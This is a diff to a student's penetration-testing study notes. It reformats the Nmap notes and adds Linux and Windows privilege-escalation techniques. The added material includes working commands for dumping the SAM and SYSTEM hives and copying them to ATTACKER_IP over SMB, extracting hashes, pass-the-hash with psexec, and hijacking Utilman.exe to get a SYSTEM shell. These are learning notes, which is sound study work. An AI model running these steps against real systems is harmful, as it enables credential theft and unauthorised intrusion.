@@ -144,11 +144,15 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - Privilege Escalation: Cron Jobs
 - Privilege Escalation: PATH
 - Privilege Escalation: NFS
+- Tools
 
 ### PHASE 8: Windows Privilege Escalation
 - Harvesting Password from usual spot
 - Other Quick Wins
 - Abusing Service Misconfigurations
+- Abusing Dangerous Privileges
+- Abusing Vulnerable Software
+- Tools
 
   
 
@@ -200,11 +204,11 @@ Pentesting is only legal when you have permission.
 
 No permission = illegal.
 
-Always follow scope and rules of engagement. Don’t test random systems.
+We need to always follow scope and rules of engagement.
 
 ## Attacker Mindset
 
-Always think like this:
+Attacker shoudl always think like this:
 
 - What is exposed?
   
@@ -221,6 +225,7 @@ Big hacks usually start from small mistakes.
 Most pentesting tools run on Linux.  
 
 Important things to know:
+
 - File system like /etc, /var, /tmp
   
 - Permissions (rwx, sudo, root)
@@ -232,6 +237,7 @@ If Linux basics are weak, exploitation becomes painful.
 ## Windows Basics
 
 Windows is very common in real environments.
+
 Things that matter:
 
 - Users and groups
@@ -246,7 +252,7 @@ Many privilege escalation paths exist because of bad Windows configs.
 
 ## Networking Basics
 
-Before attacking networks, understand them:
+Before attacking networks, we should understand them:
 
 - IP addresses
   
@@ -387,27 +393,27 @@ Without this, XSS and SQLi won’t fully click.
 
 - TCP flags:
   
-    	- TCP header = 24 bytes of a TCP segment
+  - TCP header = 24 bytes of a TCP segment
   
-    			-> First row (Source port number and Destination Port number) each allocating 16 bits (2 bytes)
+    - First row (Source port number and Destination Port number) each allocating 16 bits (2 bytes)
   
-    			-> Second row is Sequence number and third row is Acknowledgement Number
+    - Second row is Sequence number and third row is Acknowledgement Number
   
-    			-> Total six rows. Each row contains 32 bit (4 bytes) so total 6 rows equals to 24 bytes
+    - Total six rows. Each row contains 32 bit (4 bytes) so total 6 rows equals to 24 bytes
   
     	- TCP Header Flags:
   
-        		-> URG : urgent flag first priority to be processed
+       		-> URG : urgent flag first priority to be processed
   
-        		-> ACK: acknowledge the receipt of a TCP segment
+       		-> ACK: acknowledge the receipt of a TCP segment
   
-        		-> PSH: push flag asking TCP to pass the data to the applicatioh
+       		-> PSH: push flag asking TCP to pass the data to the applicatioh
   
-        		-> RST: Reset flag used to reset the connection
+     		-> RST: Reset flag used to reset the connection
   
-        		-> SYN: Synchronize flag used to initiate a TCP 3-way handshake and synchronize sequence numbers
+       		-> SYN: Synchronize flag used to initiate a TCP 3-way handshake and synchronize sequence numbers
   
-        		-> FIN: Finish flag meaning the sender has no more data to send
+       		-> FIN: Finish flag meaning the sender has no more data to send
         
 - TCP Connect Scan:
   
@@ -419,12 +425,12 @@ Without this, XSS and SQLi won’t fully click.
 
 - Other TCP scans:
   
-    	-> -sN (null), -sF (fin), -sX (Xmas)
+  - -sN (null), -sF (fin), -sX (Xmas)
         		->Similarites: if port open RST packet is received otherwise reported as open|filtered
   
-    	-> -sM (Maimon scan)
+  - -sM (Maimon scan)
   
-    	-> -sA (ACK scan)
+  - -sA (ACK scan)
 
 - UDP Scan:
   
@@ -432,24 +438,25 @@ Without this, XSS and SQLi won’t fully click.
 
 - Fine-Tuning:
   
-   		 -> -p<1-50> (set ranges), -F (100 most common ports), -T<0-5> (controlling scan timing), --min-rate<number> and --max-rate<number>
+  - -p<1-50> (set ranges), -F (100 most common ports), -T<0-5> (controlling scan timing), --min-rate<number> and --max-rate<number>
     
 - Spoofing and Decoys:
   
 		$ nmap -S SPOOFED_IP MACHINE_IP (spoofed ip)
   
 		$ nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP (Decoy)
-    			-> 3rd and 4th is randomly generated while fifth is the attacker.
   
-        	-> Advantages:  make the scan look like coming from multiple IPs so the attacker's IP would be lost.
+ 	 - 3rd and 4th is randomly generated while fifth is the attacker.
+  
+     - Advantages:  make the scan look like coming from multiple IPs so the attacker's IP would be lost.
 
 - Fragmented Packets:
   
 		$ sudo nmap -sS -p80 -f MACHINE_IP
   
-    		-> The 24 bytes of TCP header will be divided into multiple bytes of 8.
+  -> The 24 bytes of TCP header will be divided into multiple bytes of 8.
   
-    		-> So, adding another -ff will fragment the data into multiples of 16, first will get 16 bytes and thhe remaing will get the 8 bytes of the TCP header.
+  -> So, adding another -ff will fragment the data into multiples of 16, first will get 16 bytes and thhe remaing will get the 8 bytes of the TCP header.
     
 - Service Detection:
   
@@ -1219,6 +1226,16 @@ Without this, XSS and SQLi won’t fully click.
 
 	- It is important to notice that the executable file had SUID bit set, that is why the system runs with root privileges.
  
+ ## Other Tools:
+
+ - LinPEAS
+
+   		$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+   
+		$ chmod +x linpeas_linux_amd64
+
+		$ ./linpeas_linux_amd64
+ 
 # Privilege Escalation: Windows
 
 - Depending on the situation, we can abusy some of the weaknesses in the Windows to gain higher privilege of the system:
@@ -1382,7 +1399,7 @@ Without this, XSS and SQLi won’t fully click.
 
   - Services have Discretionary Access Control list (DACL) that indicates who has permission to start, stop, pause, query status. query configuration, or reconfigure the service among other privileges. If a DACL is configured for the service, it will be stored in a subkey called Security and only administrators can modify such registry entries by default.
  
-  ## Insecure Permissions on Service Executable:
+  ### Insecure Permissions on Service Executable:
 
   - If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, then the attacker can gain the privileges of the service's account.
  
@@ -1426,7 +1443,7 @@ Without this, XSS and SQLi won’t fully click.
 
 	-> After this vulnerable service gets restarted, we will get a shell of the privileged configured user account on the attack machine.
 
-## Unquoted Service Paths:
+### Unquoted Service Paths:
 
 - In case we cannot directly write into service executables like shown above, there still might be a chance to force a service into running arbitrary executables.
 
@@ -1486,7 +1503,7 @@ Without this, XSS and SQLi won’t fully click.
 
 	- As a result, we will get a reverse shell on the attacking machine of the privileged configured user that could give attacker more freedom inside the system
  
- ## Insecure Service Permissions:
+ ### Insecure Service Permissions:
 
  - We still have a slight chance of taking advantage of a service if the service's executable DACL is well configured and the service binary path is rightly quoted. We can check if the service DACL can allow us to modify the configuration of a service (not the service's executable DACL), then we could reconfigure the service. What this does is, it allows us to point to any executable we needs and run it with any account, including SYSTEM itself.
  - To cehck for a service DACL, we could use Accesschk from the Sysinternals suite.
@@ -1518,6 +1535,108 @@ Without this, XSS and SQLi won’t fully click.
 	 		> sc start SERVICE_NAME
 
 	 -> When we will look at our machine we will be at the highest privilege account of the Windows machine.
+
+## Abusing Dangerous Privileges:
+
+- Privileges are rights that an acoount can perform based on specific system-related tasks. We could even bypass some DACL-based access control because of some privileges given to low level user.
+
+  ### SeBackup/ SeRestore:
+
+  - The SeBackup and SeRestore privileges allow user to read and write to any file in the system by ignoring DACL in place. This privilege is given to some users to perform backups from a system without requiring full administrative privilege. Compromising such accounts could give an attacker power to escalate privileges on the system by using many techniques. One of which is copying the SAM and SYSTEM registry hives to extract the local Administrators password hash.
+ 
+  - We could check the privilege of the user by:
+ 
+    	> whoami /priv
+
+	- If we can see SeBackup and SeRestore privilege, then we can exploit this privilege to gain administrators password hash. The first step would be to backup the SAM and SYSTEM hashes.
+ 
+    		> reg save hklm\system C:\Users\Nischal\system.hive
+
+			> reg save hklm\sam C:\Users\Nischal\sam.hive
+
+	- This will create couple of files with the registry hives content. We can then copy these files to our attacking machine using SMB or other methods. For SMB, we could use impacket smbserver.py to host a simple SMB server with a network share of our attacking machine.
+ 
+    		$ mkdir share
+
+			$ python3 /path/to/the/smbserver.py -smb2support -username Nischal -password hello! public share
+
+	- This will create a share named public which points to the share diretory we created. Username and password are the credentials of the compromised windows target. Then, we can copy the registry hives content to transfer it to the attacking machine.
+ 
+    		> copy C:\Users\Nischal\sam.hive \\ATTACKER_IP\public\
+
+			> copy C:\Users\Nischal\system.hive \\ATTACKER_IP\public\
+
+	- Now, we can use impacket to retrieve the users password hashes.
+ 
+    		$ python3 /path/to/the/secretsdump.py -sam sam.hive -system system.hive LOCAL
+
+	- After getting the hash value of Administrator, we can perform Pass-the-Hash attack to gain access to the target machine with SYSTEM privileges. First copy the admins password hash value.
+ 
+    		$ python3 /path/to/the/psexex.py -hashes ADMIN_HASH administrator@TARGET_IP
+
+	- After this we will get a Windows cmd in our attacking machine and we will be at the highest level of privilege.
+ 
+ ### SeTakeOwnership:
+
+ - This Privilege allows a user to take ownership fo any object on the system which includes files and registry keys. This opens many possibilities for an attacker to elevate privileges. An example would be searching for a service running as SYSTEM and taking its ownership.
+
+ - The first step will be to run command promt as administrator and use the pasword of the current user to get the command line.
+
+   		> whoami /priv
+
+   - If we have a privilege named SETakeOwnershipPrivilege, then we can abuse utilman.exe to esacalte privileges. Utilman is a built-in Windows application used to provide ease of access options during the lock screen and it runs with SYSTEM privileges.
+  
+   - So, to replace utilman, we will first take ownership of it.
+  
+     		> takeown /f C:\Windows\System32\Utilman.exe
+
+	- It is important to note that being the file owner does not mean we have privileges over it, so we need to assign ourself the privilege we need.
+
+   			> icacls C:\Windows\System32\Utilman.exe /grant Nischal:F
+
+   	- After this we need to replace utilman.exe with a copy of cmd.exe.
+  
+   	  		> copy cmd.exe utilman.exe
+
+	- Finally, to trigger utilman, we will need to lock our screen and click on "Ease of Access" button to run utilman.exe. Since, we replaced it with a copy of cmd.exe, we will get a command prompt with SYSTEM privileges.
+
+ - These are some of the privileges we can exploit but depending on the system, many more could be fould such as SEImpersonate/SeAssignPrimaryToken.
+
+## Abusing Vulnerable Software:
+
+- Software installed on the target machine could also potentially lead to many privilege escalation opportunites. Like operating system, users and organisations may not update drivers or software which attackers could exploit. To gather information on the installed software we can type the following command.
+
+  		> wmic product get name,version,vendor
+
+  - This command does not guarantee to return all installed program, so it is of best practice to check desktop shortcuts, available services or any trace that indicates the existence of additional software that is vulnerable.
+ 
+  - Once enumeration on the software has been done, we could check exploit-db or google to search for known exploits.
+ 
+  ## Tools:
+
+  - Several scripts are availabe to conduct system enumeration on Windows machine which could shorten the process time of enumeration itself and uncover different potential privilege escalation vectors. However, these automated enumeration could sometimes miss privilage escaltion vulnerabilites.
+ 
+  - Some of the common tools to identify privilege escalation vectors are:
+ 
+    - WinPEAS
+
+			> winpeas.exe > output.txt
+
+	- PrivescCheck
+ 
+    		> Set-ExecutionPolicy Bypass -Scope process -Force
+
+			> . .\PrivescCheck.ps1
+
+			> Invoke-PrivescCheck
+
+	 - WES-NG
+ 
+     		> wes.py systeminfo.txt (.txt file download from Windows)
+
+	 - Metasploit
+ 
+     	- If we already have a Meterpreter shell on the target system, we can use "multi/recon/local_exploit_suggester" module to list vulnerabilites on the target system which will help us to elevate privileges.
 		
     
     
